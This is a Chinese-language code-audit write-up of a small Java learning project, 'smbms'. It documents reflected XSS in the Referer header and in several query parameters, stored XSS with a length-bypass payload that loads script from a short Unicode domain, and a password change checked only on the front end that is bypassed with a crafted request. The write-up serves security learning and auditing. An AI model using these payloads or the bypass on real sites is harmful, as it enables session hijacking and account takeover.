#  java代码审计之smbms  
德鲁骚  实战安全研究   2025-07-19 02:00  
  
# 项目地址  
  
https://github.com/wuxinyu3366/smbms  
# 代码审计  
  
这是学狂神java的一个项目，也是边学java边学代码审计吧  
项目功能点也比较少，而且sql语句采用了预编译，但是还是有些漏洞  
## Referer处存在xss  
### 漏洞分析  
  
全局搜索  
<%=  
发现在head.jsp处存在  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1Ua96mEPrXovDib3NBIaIudK999I3wNvuhRDiczbVxN2TTBeAOibytyibJ8Vw/640?wx_fmt=png&from=appmsg "")  
  
这里很明显Referer处可控，会导致xss。所以在平常渗透测试中也可以fuzz这些地方  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1UaEEECtF1cFuI246ibNDeJPsG9I5Faicaqaca5pHjsP4f6MbLJfuX83mYA/640?wx_fmt=png&from=appmsg "")  
### 漏洞复现  
  
后台中很多都调用了这个head.jsp, 多处存在xss  
找个点测试一下  
```
"><ScRiPt>alert(1)</sCrIpT>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1UamROu09Rh9p1JCfMKsiaiaUhBDj07oXcaTNAOzCmDic6S4ONRhGzvSApIA/640?wx_fmt=png&from=appmsg "")  
  
执行成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1Ua55pe9knCiaicVBaK6gIPRSicpygHOrHicVMVjB8oNfgX7n3dYVo0aGqFDg/640?wx_fmt=png&from=appmsg "")  
## 第二处xss  
### 漏洞分析  
  
全局搜索 getParameter  
queryProductName为getParameter 获取的参数  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1UaYHL8ZBjgCZQxDpXpca6kFIzAQibQSk9icPCMhVrzfrKszibhicYVZED0Rg/640?wx_fmt=png&from=appmsg "")  
  
BillServlet注册servlet的url路径为/jsp/bill.do  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1Ua1Puf3utpb0hth3JPGjib9Tr3F7BZryEp40gWoWUiaevaauAr5LohgQuw/640?wx_fmt=png&from=appmsg "")  
  
在billlist.jsp中调用的方法有/jsp/bill.do  
然后打印到如下的 jsp 代码中  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1Ua5EyWEeAyNMBQQq9Nw7ialk4F9ic3RQmNZDujpP0K51NVLm37tnvIy3Sg/640?wx_fmt=png&from=appmsg "")  
### 漏洞复现  
```
http://localhost:8080/jsp/bill.do?method=query&queryProductName=%22%3E%3CScRiPt%3Ealert%281%29%3C%2FsCrIpT%3E&queryProviderId=0&queryIsPayment=0
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1UaenMuHx0y43Q472yaq9Pgdv8icpyF7JhFGPUibgkRp5XgHdLFa8k1r2LQ/640?wx_fmt=png&from=appmsg "")  
## 第三处xss  
### 漏洞分析  
  
全局搜索 getParameter  
queryProCode、queryProName为getParameter 获取的参数  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1UaEjDO0L5IVSw5zctbFcy6nRmicTqqXwa587ibYlm0JniciapwFt4AkKmE8w/640?wx_fmt=png&from=appmsg "")  
  
ProviderServlet注册servlet的url路径为/jsp/provider.do  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1UaN1hJwwEon7lXhlQqlkBCR1rGFJrMia4PFf4FhDO6rV4lwX8P4zsnjEg/640?wx_fmt=png&from=appmsg "")  
  
在providerlist.jsp中调用的方法有/jsp/provider.do  
然后打印到如下的 jsp 代码中  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1UakdBIiak7QYmS1o36xgbsjIDjcEyGCeiatQ9lic5aeIkjaWjLkRw8qqhOA/640?wx_fmt=png&from=appmsg "")  
### 漏洞复现  
```
http://localhost:8080/jsp/provider.do?method=query&queryProCode=%22%3E%3CScRiPt%3Ealert%281%29%3C%2FsCrIpT%3E&queryProName=
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1Ua4bu7TNbialrg1dfMz218lq5W81iaVDY7HQWgZDSjbp6rbnLzEHCtFqOQ/640?wx_fmt=png&from=appmsg "")  
## 第四处xss  
### 漏洞分析  
  
全局搜索 getParameter  
queryname为getParameter 获取的参数  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1UazZa3SDvpUtyjJFAbmzEclevmK0JibKS5oem2Hn9Q0cSTOcah9gM8ZLQ/640?wx_fmt=png&from=appmsg "")  
  
UserServlet注册servlet的url路径为/jsp/user.do  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1UaywGRehx8CcZFd6x8mtDwWzvZ2cKu7FoTyFyPlsPtjHlNtpochobn9g/640?wx_fmt=png&from=appmsg "")  
  
在providerlist.jsp中调用的方法有/jsp/provider.do  
然后打印到如下的 jsp 代码中  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1UaByXncHSe8UzyLibgdmWQ7IxWiaE2ic37UGtNaIvWia4BPgawUlhMgGbuLQ/640?wx_fmt=png&from=appmsg "")  
### 漏洞复现  
```
http://localhost:8080/jsp/user.do?method=query&queryname=%22%3E%3CScRiPt%3Ealert%281%29%3C%2FsCrIpT%3E&queryUserRole=0&pageIndex=1
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1UaVFib3d02OKuIyLMYclicLzl6DyiaiabA7c5Rj0VDN1yogdLpVzsicfFNm4w/640?wx_fmt=png&from=appmsg "")  
## 存储型xss  
### 漏洞分析  
  
全局搜索数据库的插入语句(关键词:insert,save,update)，然后全局搜索该方法在哪里被调用，一层层的跟踪。直到 getParamter()方法获取请求参数的地方停止。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1UaI88qOglNYvSiaNuVEleeKJbqNXhfxopL3h5jGerCkRSEjV4kv11tt0g/640?wx_fmt=png&from=appmsg "")  
  
从getParamter 关键词开始 ，跟踪请求参数，直到插入数据库的语句，如果中间没有过滤参数，则存在存储型 XSS  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1Ua6WLAiahkLtI6T8S7HMljpmcmoiaM1cf7e2WSVaHoeF2EibCD1Dd4ibLXCA/640?wx_fmt=png&from=appmsg "")  
### 漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1UaAQVZMz0kicGb8YEUVmM3bN4j3CwXA5GQgc3p7qCxsbprGB1XtQ7qXsA/640?wx_fmt=png&from=appmsg "")  
  
保存之后，再点击供应商的详情直接触发了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1UasjIbQHWBcdbe6UfDkVQcIzlDKpyiaZjf8v6d0MbT6GaVxeMwJ3oXlZQ/640?wx_fmt=png&from=appmsg "")  
## 存储型xss之长度绕过  
  
这里肯定会奇怪我为什么没有插入到供应商编码或者供应商名称这些地方。这就跟数据库有关系了，虽然中间没有过滤参数，但是数据库有的地方定义的数字类型，字符串是不行的。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1UalOF1VibDic8XZEw4gp4xDwAIsciaL0TkyeZnpznFNKZbib4jNqyEDaDoEg/640?wx_fmt=png&from=appmsg "")  
  
还有就是数据库中定义了字符串的长度为20，这就要使xss的语句小于20，但是常规的都是比它大的，这里就要绕过了。  
参考这里  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1UasuOuoEjxjtgRcvSn976wS4N7sy2RfoSiafPMJxqoTpvicrrcOme0Xqug/640?wx_fmt=png&from=appmsg "")  
  
<script/src=//⑭.₨>，只有18个字符。其中₨代表印度卢比，这是1个字符，而不是2个字符，而⑭也是类似的效果。下面测试一下效果  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1UaNicmWVR7Ply1icPeab2Sr1mial6JQMkOUfMIwP3TUqRxgEZ78cVBxHh6g/640?wx_fmt=png&from=appmsg "")  
  
每次刷新查询供应商界面的时候都会触发xss  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1UaFBjicSJWLWXzADvt2DRDdjTM9GkIu1Gliaw5HfS2GoFjjq95ibxtgVibFA/640?wx_fmt=png&from=appmsg "")  
## 任意密码修改  
### 漏洞分析  
  
后台密码修改处存在一个输入旧密码就能判断是否正确的功能  
效果如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1UathFoPFwvTRmnMNt34zcOBFKVV3CMtHYFd6Mm1wXl3eUOGWCoiaEnYiag/640?wx_fmt=png&from=appmsg "")  
  
实现这个是在js中利用了一段ajax去处理数据  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1Uaw8q7fHvp1L1AC9MPic0pjlEf6TaYbqnlcHxGJpCfIu5xKxicdhurNqCw/640?wx_fmt=png&from=appmsg "")  
  
然后旧密码，新密码，确认新密码这三段都为true，就可以执行修改密码的方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1UaF6ugiczSS5cj9ibcLVJZgOvJXqnTJ1wibspysN4icF7cfaFRFtT0I7rlHg/640?wx_fmt=png&from=appmsg "")  
  
既然这里前端认证，那这个旧密码完全就可以不用填写，直接写新密码就行了  
### 漏洞复现  
  
直接构造修改密码的数据包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1Ual1DM09a9Ifd2l3OfB9v66d7vK03UibJ5R9YBT4IugTGdAz9ZyOofeng/640?wx_fmt=png&from=appmsg "")  
  
发现密码修改成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1OC3jrhzDFu2bVOCVbV1UaXflyLkr1VmyS3F59MUdO24LE0K54H8VKpicksnqIyPTO9FxhCnvAvCg/640?wx_fmt=png&from=appmsg "")  
```
作者：德鲁骚
原文链接：https://xz.aliyun.com/news/11672
```  
  
  
